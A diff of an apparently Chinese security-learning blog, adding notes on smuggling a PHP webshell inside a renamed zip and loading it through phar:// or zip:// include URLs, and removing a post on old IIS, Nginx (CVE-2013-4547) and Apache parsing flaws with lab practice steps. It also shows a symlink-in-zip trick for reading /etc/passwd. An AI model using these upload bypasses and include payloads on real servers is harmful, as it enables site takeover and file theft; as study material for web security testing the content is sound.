+<p>写一个shell.php文件，里面包含一句话木马。然后，压缩成xxx.zip。然后改名为xxx.jpg进行上传。最后使用phar进行包含</p>
+<p>这里的路径为上传的 jpg 文件在服务器的路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?id=phar://路径/xxx.jpg/shell</span><br></pre></td></tr></table></figure>
+<h2 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h2><p>上述 phar:// 的方法也可以使用 zip://</p>
+<p>然后吧1.php文件压缩成zip，再把zip的后缀改为png，上传上去，并且可以获得上传上去的png的地址。</p>
+<p>1.zip文件内仅有1.php这个文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/php?file=zip://1.png%231.php  </span><br><span class="line"></span><br><span class="line">// 也可以尝试不改名为png，直接使用zip上传测试一下</span><br><span class="line">/php?file=zip://1.zip%231.php  </span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -2067,100 +2246,6 @@ sqlmap --crawl(sqlmap对目标网站进行爬取，然后依次进行测试）
 <p>2.部分此类有检测压缩包中内容的，可尝试建立目录进行压缩 </p>
 <p>3.使用目录穿越../的方法向上一级目录进行上传 </p>
 <p>将文件软连接打包到压缩包中    文件软连接到/etc/passwd等文件，达到任意文件读取ln -s /etc/passwd ./azip –symlinks -r photos.zip ./a </p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/21/%E8%A7%A3%E6%9E%90/%E4%B8%80%E4%BA%9B%E8%80%81%E6%8E%89%E7%89%99%E4%BD%86%E6%98%AF%E5%A5%BD%E7%90%86%E8%A7%A3%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/pic.jpg">
-      <meta itemprop="name" content="D0gekong">
-      <meta itemprop="description" content="散人的漫漫学习路">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hack the world">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/03/21/%E8%A7%A3%E6%9E%90/%E4%B8%80%E4%BA%9B%E8%80%81%E6%8E%89%E7%89%99%E4%BD%86%E6%98%AF%E5%A5%BD%E7%90%86%E8%A7%A3%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">一些老掉牙但是好理解的解析漏洞</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-03-21 20:57:52 / 修改时间：21:24:48" itemprop="dateCreated datePublished" datetime="2022-03-21T20:57:52+08:00">2022-03-21</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>解析漏洞是指服务器应用程序在解析某些静态文件或者动态文件时，会将其解析成网页脚本，从而导致网站的沦陷</p>
-<h2 id="IIS-Nginx-php-fastcgi取值错误解析漏洞-配置漏洞"><a href="#IIS-Nginx-php-fastcgi取值错误解析漏洞-配置漏洞" class="headerlink" title="IIS/Nginx+php fastcgi取值错误解析漏洞(配置漏洞)"></a>IIS/Nginx+php fastcgi取值错误解析漏洞(配置漏洞)</h2><p>开启了cgi.fix_pathinfo如果开启以后，所执行文件不存在，会继续查找上一级文件是否存在。index.php/id/2</p>
-<p>并且未设置security.limit_extensions该选项限制可以执行的文件类型</p>
-<p>示例:abcde.jpg/.php</p>
-<h3 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h3><p>选择一个phpinfo.jpg进行上传，内容为phpinfo();，但被拦截应该是不仅对扩展名验证还对文件内容进行了验证，所以采取copy命令将一张gif和phpinfo进行构造过文件类型检测，上传成功并能成功访问图片，随后访问url/xx.gif/1.php，便能够访问到phpinfo页面</p>
-<h2 id="Nginx文件名逻辑漏洞-CVE-2013-4547"><a href="#Nginx文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="Nginx文件名逻辑漏洞(CVE-2013-4547)"></a>Nginx文件名逻辑漏洞(CVE-2013-4547)</h2><p>影响版本：Nginx0.8.41 <del>1.4.3/1.5.0</del>1.5.7</p>
-<p>上传一个以空格(%20)为结尾的文件，例如abcde.jpg “</p>
-<p>当访问abcde.jpg%20%00.php时，会将刚刚上传的“abcde.jpg “文件当做php进行执行</p>
-<p>abcde.jpg%20%00.php</p>
-<p>一般的php匹配正则: .php$</p>
-<p>存在漏洞时，Nginx将abcde.jpg%20认当做了脚本文件名</p>
-<h3 id="练习：-1"><a href="#练习：-1" class="headerlink" title="练习："></a>练习：</h3><p>首先上传一个phpinfo.php无法上传，上传一个phpinfo.gif可以上传，进行修改提交并截包，在文件名后面加一个空格成功上传，然后抓包修改在url后面添加%20%00.php并进行url解码访问文件，返回phpinfo页面</p>
-<h2 id="Apache解析漏洞（配置错误）"><a href="#Apache解析漏洞（配置错误）" class="headerlink" title="Apache解析漏洞（配置错误）"></a>Apache解析漏洞（配置错误）</h2><p>如果在Apach的conf文件中有如下配置</p>
-<p>AddHandler application/x-httpd-php .php</p>
-<p>则abcde.php.jpg也会被当做php去执行</p>
-<p>如果在.htaccess中有如下配置，可以将扩展名.xxx当做php执行</p>
-<p>AddType application/x-httpd-php xxx</p>
-<h3 id="练习：-2"><a href="#练习：-2" class="headerlink" title="练习："></a>练习：</h3><p>在phpinfo.gif中间加一个.php，点击上传并访问，回显phpinfo.php的页面，但如果只是单纯的上传一个图片gif文件，只会是图片回显</p>
-<h2 id="IIS-5-x-6-0解析漏洞"><a href="#IIS-5-x-6-0解析漏洞" class="headerlink" title="IIS 5.x/6.0解析漏洞"></a>IIS 5.x/6.0解析漏洞</h2><ol>
-<li><p>上传文件名：abcde.asp;.jpg<br>服务器默认不解析；号后面的内容，因此abcde.asp;.jpg被当做了asp文件解析</p>
-</li>
-<li><p>向xxx.asp目录下面上传abcde.jpg</p>
-</li>
-</ol>
-<p>服务器会将xxx.asp目录下的文件都当做asp文件解析</p>
-<p>（环境是在FckEditor下）</p>
-<h3 id><a href="#" class="headerlink" title></a></h3><h3 id="练习：-3"><a href="#练习：-3" class="headerlink" title="练习："></a>练习：</h3><p>上传一个内容为打印helloworld的hello.asp但并不能上传，抓包修改在文件的后面添加;.jpg发包，成功上传并访问该文件，页面成功打印出Helloworld</p>
-<p>创建一个文件夹1.asp但里面没有任何内容，把hello.asp改为hello.jpg上传到该文件夹，访问Url/1.asp/hello.jpg,成功打印helloworld</p>
-<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="查看服务器类型"><a href="#查看服务器类型" class="headerlink" title="查看服务器类型"></a>查看服务器类型</h2><p>1.F12查看响应头中的server，里面含有服务器类型的名字或者版本号（注意！可修改）</p>
-<p>2.访问一个不存在的文件，比如IIS会进行报错有服务器信息</p>
 
       
     </div>
